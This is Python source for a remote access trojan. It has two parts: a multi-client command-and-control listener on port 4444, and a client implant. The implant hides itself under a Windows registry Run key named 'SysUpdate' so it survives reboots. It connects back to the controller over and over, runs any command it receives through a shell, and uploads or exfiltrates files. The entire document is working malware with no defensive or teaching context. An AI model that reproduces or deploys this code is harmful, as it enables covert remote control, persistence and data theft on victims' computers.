import socket, threading, os, sys, time

HOST = "0.0.0.0"
PORT = 4444
BUFFER = 4096

clients = {}

def handle_client(conn, addr):
    print(f"[+] Connection from {addr}")
    clients[addr] = conn
    try:
        while True:
            cmd = input(f"{addr} > ").strip()
            if not cmd:
                continue
            if cmd.lower() in ("exit", "quit"):
                conn.send(b"__EXIT__")
                break
            if cmd.lower() == "list":
                print("Active:", list(clients.keys()))
                continue
            if cmd.lower().startswith("download "):
                path = cmd.split(" ", 1)[1]
                conn.send(f"__DOWNLOAD__{path}".encode())
                data = conn.recv(BUFFER)
                if data.startswith(b"__ERR__"):
                    print("[!] Remote error:", data[7:].decode(errors="ignore"))
                    continue
                fname = os.path.basename(path)
                with open(fname, "wb") as f:
                    while data and not data.endswith(b"__DONE__"):
                        f.write(data)
                        data = conn.recv(BUFFER)
                    if data.endswith(b"__DONE__"):
                        f.write(data[:-8])
                print(f"[+] Saved {fname}")
                continue
            if cmd.lower().startswith("upload "):
                local = cmd.split(" ", 1)[1]
                conn.send(f"__UPLOAD__{os.path.basename(local)}".encode())
                time.sleep(0.2)
                with open(local, "rb") as f:
                    while chunk := f.read(BUFFER):
                        conn.send(chunk)
                conn.send(b"__DONE__")
                print("[+] Uploaded.")
                continue

            conn.send(cmd.encode())
            out = b""
            conn.settimeout(2)
            try:
                while True:
                    chunk = conn.recv(BUFFER)
                    if not chunk:
                        break
                    out += chunk
                    if len(chunk) < BUFFER:
                        break
            except socket.timeout:
                pass
            conn.settimeout(None)
            print(out.decode(errors="ignore"))
    except Exception as e:
        print(f"[!] {addr} error: {e}")
    finally:
        conn.close()
        clients.pop(addr, None)
        print(f"[-] {addr} disconnected")

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(5)
    print(f"[*] Listening on {HOST}:{PORT}")
    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

if __name__ == "__main__":
    main()

import socket, subprocess, os, sys, time, threading

RETRY = 5

def persist():
    """Windows persistence via registry Run key."""
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SysUpdate", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(key)
    except Exception:
        pass

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            return s
        except Exception:
            time.sleep(RETRY)

def shell(s):
    while True:
        try:
            cmd = s.recv(BUFFER).decode(errors="ignore")
            if not cmd:
                break
            if cmd == "__EXIT__":
                s.close()
                sys.exit(0)
            if cmd.startswith("__DOWNLOAD__"):
                path = cmd[len("__DOWNLOAD__"):]
                if not os.path.exists(path):
                    s.send(b"__ERR__File not found")
                    continue
                with open(path, "rb") as f:
                    while chunk := f.read(BUFFER):
                        s.send(chunk)
                s.send(b"__DONE__")
                continue
            if cmd.startswith("__UPLOAD__"):
                fname = cmd[len("__UPLOAD__"):]
                with open(fname, "wb") as f:
                    while True:
                        data = s.recv(BUFFER)
                        if data.endswith(b"__DONE__"):
                            f.write(data[:-8])
                            break
                        f.write(data)
                s.send(b"[+] Uploaded")
                continue

            proc = subprocess.Popen(cmd, shell=True,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
            out, _ = proc.communicate()
            if not out:
                out = b"[no output]"
            s.send(out)
        except Exception:
            break

def main():
    persist()
    while True:
        s = connect()
        shell(s)
        time.sleep(RETRY)

if __name__ == "__main__":
    main()
